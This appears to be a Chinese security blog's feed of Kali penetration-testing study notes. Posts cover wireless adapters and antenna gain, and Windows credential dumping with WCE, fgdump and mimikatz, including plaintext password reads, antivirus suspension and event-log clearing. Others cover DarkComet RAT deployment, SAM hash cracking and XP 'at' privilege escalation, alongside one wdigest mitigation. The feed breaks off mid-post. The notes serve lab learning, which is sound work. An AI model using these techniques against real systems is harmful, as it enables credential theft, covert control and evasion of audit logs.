title="无线网卡准备"></a>无线网卡准备</h4><ul><li><p>物理机运行kali</p></li><li><p>虚拟机运行kali</p><ul><li><p>外置USB无线网卡（必须）</p></li><li><p>TL-WN722N</p></li><li><p>dmesg (硬件设备变化的记录)</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20230102113321224.png" alt="image-20230102113321224"></p></li><li><p>iwconfig (查看无线网卡信息)</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/image-20230102113334512.png" alt="image-20230102113334512"></p></li></ul></li></ul><h4 id="选择无线网卡"><a href="#选择无线网卡" class="headerlink" title="选择无线网卡"></a>选择无线网卡</h4><p><strong>重点关注无线网卡的芯片型号</strong></p><p><strong>台式机</strong></p><ul><li>USB无线网卡(不支持扩展天线)</li><li>PCMCIA (16bit 已停产802.11b)</li><li>Cardbus (32bit PCMCIA 8.0标准)</li><li>Express Cards</li><li>MiniPCI</li><li>MiniPCI Express</li><li>PCI接口卡</li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320150415481-506041574.png" alt="img"></p><p><strong>发送功率：</strong>远程连接</p><p><strong>接收灵敏性：</strong>适当降低灵敏度，接收效果更佳</p><p><strong>各种型号的介绍：</strong><a href="https://www.aircrack-ng.org/doku.php?id=compatibility_drivers_old">https://www.aircrack-ng.org/doku.php?id=compatibility_drivers_old</a></p><ul><li><p>无线渗透网卡没有所谓标准，但是Aircrack ng suite作者给出建议</p></li><li><p>Alfa Networks AWUS036H无线网卡</p><ul><li>Realtek 8187芯片</li><li>1000 mW发送功率</li><li>天线: RP-SMA<ul><li>可扩展</li></ul></li></ul></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320150554321-1455052487.png" alt="img"></p><h2 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a>无线技术概念</h2><p><strong>分贝dB</strong></p><ul><li>测量无线信号强度</li></ul><p><strong>dB：</strong>表示2个信号之间的<strong>差异比率</strong>，用于描述设备的信号强度</p><ul><li>是一个<strong>相对值</strong></li></ul><p><strong>dBm：</strong>功率值与1mW进行比较的dB值结果</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320150654935-413839504.png" alt="img"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320150706953-335968410.png" alt="img"></p><p>每增加3dBm，功率增加约1倍</p><p>每增加10dBm，功率增加10倍</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320150752826-57621668.png" alt="img"></p><ul><li>dBi：全向天线辐射强度<ul><li>全向天线的信号功率增益</li><li>增益是指信号功率强度增加了多少dB</li></ul></li></ul><p>300mW的无线路由器，添加一个9dB的天线后功率如何变化(假设2dBi的电缆和接头耗损)</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151019440-2036874006.png" alt="img"></p><p>换算回mW功率</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151029432-997961856.png" alt="img"></p><p>dBm功率相加等于mW功率相乘</p><ul><li><p>dBd：定向天线辐射强度</p><ul><li>定向天线的增益值</li><li>全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号</li><li>天线增益越大信号传输距离越远</li></ul></li><li><p>既然有mW来表示功率为什么还要引入dB这个单位?</p><ul><li>接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W、mW来计数非常不便，而dBm单位通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达功率的变化，因此无线和声学系统都采用了dB这个单位。</li></ul></li><li><p>全向天线波形图</p><ul><li>甜甜圈</li></ul></li><li><p>天线选择的误区</p><ul><li>增益越高越好<ul><li>高功耗</li><li>对周围环境的信号干扰</li></ul></li></ul></li><li><p>增益过高的全向天线会变成定向天线</p></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151339813-294426965.png" alt="img"></p><ul><li>5dBi 全向天线波形</li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151510165-760627152.png" alt="img"></p><ul><li>9dBi 全向天线波形</li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151519831-924726108.png" alt="img"></p><ul><li>定向天线<ul><li>定向发送信号</li><li>功率相同时，比全向天线传输距离更远(方向正确的情况下)</li></ul></li></ul><p>双四边形</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151604793-940549486.png" alt="img"></p><p>八木天线，引向反射天线</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151646691-906289957.png" alt="img"></p><p>平面天线</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/2379545-20220320151725125-1466179126.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-提权【三】</title>
      <link href="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/"/>
      <url>/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="WINDOWS身份认证过程"><a href="#WINDOWS身份认证过程" class="headerlink" title="WINDOWS身份认证过程"></a>WINDOWS身份认证过程</h2><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/2379545-20220214183649360-1402844854.png" alt="img"></p><blockquote><p>当启动windows后，电脑首先会进入自检阶段，BOIS对硬件进行自检，然后找到计算中安装的第一个硬盘设备，从中定位到系统分区，找到操作系统所在的分区，按照路径找到操作系统内核文件，之后会进入用户登录的界面，这个界面被称为Windows NT Logon模块，用来对用户输入的账号密码进行计算和身份验证；winlogon.exe这个进程启动用户登录界面，当输入帐号密码后，这个进程会和LSA（本地安全助理）这个进程进行交互，由winlogon将身份验证信息传递给LSA AUTH API，再由LSA AUTH API对应的执行程序LSASRV.DLL动态链接库文件将身份验证信息传递给后端的账号数据库，再由账号数据库提取NTLM和LM两种哈希值进行比对，若比对值匹配winlogon进程则结束就进入操作系统；进入操作系统之后，在进入操作系统后系统会指派一个权限令牌到用户所登录启动的LSASS.exe进程中，这样用户就完成了登录过程。</p></blockquote><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/2379545-20220214183705993-1804744301.png" alt="img"></p><blockquote><p>首先当通过登录窗口输入帐号密码后，winlogon进程对密码进行LMHash和NTHash（两个函数），通过这两个函数对密码进行计算，再将计算好的密码与后端的数据库，由LSA这个模块进行比对，若比对匹配就登录进入操作系统；若是网络登录同理。</p></blockquote><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/2379545-20220214183722335-1848117876.png" alt="img"></p><blockquote><p>*<em>账户在登陆的目标服务器&#x2F;系统后，系统中 <em>WDisgest</em>安全包会在内存中维护当前处于登录状态账户明文的密码，当注销登陆后才会被删除。</em>* </p></blockquote><h2 id="WCE（WINDOWS-CREDENTIAL-EDITOR）"><a href="#WCE（WINDOWS-CREDENTIAL-EDITOR）" class="headerlink" title="WCE（WINDOWS CREDENTIAL EDITOR）"></a>WCE（WINDOWS CREDENTIAL EDITOR）</h2><blockquote><ul><li>Windows Credentials Editor (WCE)（windows凭证信息编辑器）是一款功能强大的windows平台内网渗透工具。</li><li>作用<ul><li>列举登陆会话，并且可以添加、改变和删除相关凭据（例如：LM&#x2F;NT hashes）。这些功能在内网渗透中能够被利用，例如，在windows平台上执行绕过hash或者从内存中获取NT&#x2F;LM hashes（也可以从交互式登陆、服务、远程桌面连接中获取）以用于进一步的攻击。可以查看系统当前登陆用户的登陆密码的密文形式和明文形式。</li></ul></li><li>要求<ul><li>使用需具有管理员权限</li></ul></li></ul></blockquote><p>wce-universal.exe参数</p><pre class="line-numbers language-none"><code class="language-none">-l：查看当前登录账号的密码的密文形式的哈希值【lmhash：nthash】-lv：表示查看更详细的信息【注入模式可能会对系统进程造成损坏】-r：每隔几秒去重新读下，看有没有新账户登录（默认5s）。-d：通过指定LUID删除某一会话。-g：计算指定密码的LM和NTLM哈希值。-w：读内存中 WDisgest 安全包维护的当前登录账户的明文密码。注意：wce是从内存中读取，pwdump是从数据库SAM中读取的！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在xp机器上切换用户使其都处于登录状态</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101112954143.png" alt="image-20230101112954143"></p><p><code>-l</code>参数：查看当前登录账号的密码的密文形式的哈希值【lmhash：nthash】</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101113136258.png" alt="image-20230101113136258"></p><p><code>-lv</code>参数：表示查看更详细的信息【注入模式可能会对系统进程造成损坏】</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101113434738.png" alt="image-20230101113434738"></p><blockquote><p>其中从内存中首先会以安全的模式读取（safe mode），若读取不成功，则会选择注入的方式（less-safe mode）获取信息；（注入方式可能会使系统报错）</p></blockquote><p><code>-d</code>参数：删除LUID</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101114454092.png" alt="image-20230101114454092"></p><p><code>-g</code>参数：计算LM和NTLM哈希值</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101114633701.png" alt="image-20230101114633701"></p><blockquote><p>冒号分隔，前一段是LMHash，后一段是NTLMHash</p></blockquote><p><code>-w</code>参数：读内存中 WDisgest 安全包维护的当前登录账户的明文密码。</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101114803338.png" alt="image-20230101114803338"></p><p>参数 <code>-i + -s</code>：（修改指定会话的登录信息）</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101120237815.png" alt="image-20230101120237815"></p><blockquote><p>将test的LUID修改为admin帐户信息</p></blockquote><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101120745330.png" alt="image-20230101120745330"></p><h2 id="WCE攻击防御"><a href="#WCE攻击防御" class="headerlink" title="WCE攻击防御"></a>WCE攻击防御</h2><blockquote><p><strong>由于系统是通过 Digest Authentication Package 在内存中维护明文密码，默认自启动，为此可去注册表中关闭默认启动。</strong></p><p>注册表路径：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</p></blockquote><p>删除其中的<code>wdigest</code>则查看不到明文密码</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101121307516.png" alt="image-20230101121307516"></p><blockquote><p><strong>Security Packages默认项：</strong></p><ul><li>kerberos</li><li>msv1_0</li><li>schannel</li><li><strong>wdigest 本地内存维护明文密码</strong></li><li><strong>tspkg 远程终端维护……</strong></li><li>pku2u</li></ul></blockquote><h2 id="相似工具"><a href="#相似工具" class="headerlink" title="相似工具"></a>相似工具</h2><h4 id="fgdump"><a href="#fgdump" class="headerlink" title="fgdump"></a>fgdump</h4><blockquote><p>路径：&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump</p></blockquote><p>将fgdump文件夹上传到XP主机</p><p>双击fgdump.exe会生成三个密码文件</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101172235653.png" alt="image-20230101172235653"></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101172605802.png" alt="image-20230101172605802"></p><blockquote><p>生成的文件其中会提取用户信息</p></blockquote><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>双冒号<code>::</code>查看参数信息</p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101173329300.png" alt="image-20230101173329300"></p><p><strong>privilege模块：提权</strong></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101173447315.png" alt="image-20230101173447315"></p><p><strong>sekurlsa模块：查看登录账号密码信息等</strong></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101173716376.png" alt="image-20230101173716376"></p><p><strong>process模块：管理进程</strong></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101173744881.png" alt="image-20230101173744881"></p><p><strong>service模块：服务管理</strong></p><blockquote><p><strong>suspend子模块：挂起进程，可用于植入木马时，暂停防病毒软件。</strong></p><p><strong>resume子模块：进程恢复</strong></p></blockquote><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101173855014.png" alt="image-20230101173855014"></p><p><strong>lsadump模块</strong></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101174541149.png" alt="image-20230101174541149"></p><p><strong>ts模块：终端服务，默认情况下XP只允许一个活动的登录会话</strong></p><blockquote><p>使用此模块相当于打上一个补丁，使多个会话可以并行，即多用户登录。</p></blockquote><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101174833483.png" alt="image-20230101174833483"></p><p><strong>event模块：日志管理</strong></p><blockquote><p><strong>clear：清除已记录的安全日志等</strong></p><p><strong>drop：不再产生新的日志记录</strong></p></blockquote><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101175110779.png" alt="image-20230101175110779"></p><p><strong>misc模块：杂项</strong></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101175208855.png" alt="image-20230101175208855"></p><p><img src="/2023/01/01/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%89%E3%80%91/image-20230101175317132.png" alt="image-20230101175317132"></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-提权【二】</title>
      <link href="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/"/>
      <url>/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h2><blockquote><ul><li>Windows<ul><li>Wireshark</li><li>Omnipeek<ul><li>下载：<a href="https://www.liveaction.com/">https://www.liveaction.com/</a></li><li>OmniPeek_UserGuide：<a href="https://mypeek.liveaction.com/elements/mypeek_documentation/manuals/OmniPeek_UserGuide.pdf">https://mypeek.liveaction.com/elements/mypeek_documentation/manuals/OmniPeek_UserGuide.pdf</a></li></ul></li><li>commview<ul><li>早期XP上使用</li></ul></li><li>Sniffpass<ul><li>抓包收集密码</li><li>下载：<a href="https://www.nirsoft.net/toolsdownload/sniffpass.zip">https://www.nirsoft.net/toolsdownload/sniffpass.zip</a></li></ul></li></ul></li><li>Linux<ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff</li></ul></li></ul><p><strong>当控制了一台主机之后，就可以在此主机上运行抓包嗅探工具获取更多的密码</strong></p></blockquote><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><blockquote><ul><li>Keylogger</li><li>木马窃取</li></ul></blockquote><h4 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h4><p>参见：<a href="https://noobxw.github.io/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/">https://noobxw.github.io/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/</a></p><h4 id="木马窃取-DarkComet"><a href="#木马窃取-DarkComet" class="headerlink" title="木马窃取-DarkComet"></a>木马窃取-DarkComet</h4><p>生成服务器端</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113048845.png" alt="image-20221231113048845"></p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113110951.png" alt="image-20221231113110951"></p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113118984.png" alt="image-20221231113118984"></p><p>启动侦听</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113229390.png" alt="image-20221231113229390"></p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113237249.png" alt="image-20221231113237249"></p><p>将生成的木马程序上传到客户端</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113609494.png" alt="image-20221231113609494"></p><p>启动木马程序在服务端便可以侦听到</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113658338.png" alt="image-20221231113658338"></p><p>右键打开远程桌面</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113843712.png" alt="image-20221231113843712"></p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231113936412.png" alt="image-20221231113936412"></p><blockquote><p>此时就可以进行实时的监控</p></blockquote><h2 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h2><blockquote><ul><li>浏览器缓存的密码<ul><li>IE浏览器</li><li>Firefox</li></ul></li><li>网络密码</li><li>无线密码</li><li><a href="http://www.nirsoft.net/">http://www.nirsoft.net</a></li><li>Dump SAM<ul><li>Pwdump</li><li>&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump&#x2F;</li></ul></li></ul></blockquote><h4 id="浏览器缓存的密码"><a href="#浏览器缓存的密码" class="headerlink" title="浏览器缓存的密码"></a>浏览器缓存的密码</h4><p><strong>Firefox</strong></p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231115147990.png" alt="image-20221231115147990"></p><blockquote><p>各大浏览器中都会缓存密码</p></blockquote><h4 id="网络密码"><a href="#网络密码" class="headerlink" title="网络密码"></a>网络密码</h4><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231115854451.png" alt="image-20221231115854451"></p><h4 id="无线密码"><a href="#无线密码" class="headerlink" title="无线密码"></a>无线密码</h4><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231120338023.png" alt="image-20221231120338023"></p><h4 id="密码还原工具集"><a href="#密码还原工具集" class="headerlink" title="密码还原工具集"></a>密码还原工具集</h4><p><a href="https://www.nirsoft.net/password_recovery_tools.html">https://www.nirsoft.net/password_recovery_tools.html</a></p><h4 id="Dump-SAM"><a href="#Dump-SAM" class="headerlink" title="Dump SAM"></a>Dump SAM</h4><blockquote><p>操作系统本身不保存储帐号密码明文形式，保存的是账号密文形式，对密码进行哈希计算在操作系统中保存密码的哈希值，当登录操作系统输入明文密码后，登录组件进行相同的哈希计算，算出来的哈希值会和操作系统里的账号数据库中保存的密码哈希值进行比对，哈希值匹配则登录成功，否则反之。</p></blockquote><p>提取本地密码密文形式</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231164750927.png" alt="image-20221231164750927"></p><p>将用户名，密文复制下来，单独存个.pwdump文件，利用Kali中的解密工具解密</p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231172450364.png" alt="image-20221231172450364"></p><p><img src="/2022/12/29/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%BA%8C%E3%80%91/image-20221231174241404.png" alt="image-20221231174241404"></p><blockquote><p>其中<code>not found</code>表示破解失败，当密码大于8位的时候是很难破解的</p></blockquote><p>NET-NTLM2理解及hash破解：</p><p><a href="https://www.cnblogs.com/junsec/p/11810703.html">https://www.cnblogs.com/junsec/p/11810703.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-提权【一】</title>
      <link href="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/"/>
      <url>/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><blockquote><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获取账号密码</li></ul></li><li>希望获取更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登录已在后台启动服务</li></ul></li></ul></blockquote><h4 id="Windows权限"><a href="#Windows权限" class="headerlink" title="Windows权限"></a>Windows权限</h4><blockquote><ul><li>user  # 普通用户权限</li><li>Administrator  # 管理员权限</li><li>Sysytem   # 系统权限</li></ul></blockquote><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/2379545-20220213115539306-794303017.png" alt="img"></p><h4 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h4><blockquote><ul><li>User   # 普通用户权限</li><li>Root   # 最高权限</li></ul></blockquote><h2 id="系统工具提权"><a href="#系统工具提权" class="headerlink" title="系统工具提权"></a>系统工具提权</h2><h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><blockquote><p>只能在XP与2003的系统上使用，win7之后at命令就被删除掉了</p><p>at命令会调用system权限执行进而达到提权的目的</p></blockquote><ul><li><p>at 10:54  &#x2F;interactive cmd</p><blockquote><p>interactive  # 使用交互的方式执行，否则会在后台运行</p></blockquote><p><img src="/2022/12/24/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%8F%90%E6%9D%83%E3%80%90%E4%B8%80%E3%80%91/image-20221224105303370.png" 